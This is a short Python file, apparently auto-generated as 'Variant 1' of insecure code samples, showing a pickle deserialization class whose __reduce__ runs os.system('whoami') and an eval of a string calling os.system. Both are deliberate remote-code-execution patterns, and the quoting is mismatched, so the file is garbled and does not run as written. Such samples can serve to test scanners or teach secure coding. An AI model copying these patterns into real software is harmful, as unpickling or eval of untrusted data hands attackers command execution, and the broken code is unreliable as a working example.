# Variant 1 - Generated at 2026-03-30T08:16:36.483787

import pickle
import os
import base64

# Malicious pickle deserialization
class RCE:
    def __reduce__(self):
        return (os.system, ("whoami',))

payload = pickle.dumps(RCE())
pickle.loads(payload)

# Eval injection
user_input = 'os.system('whoami')"
eval(user_input)
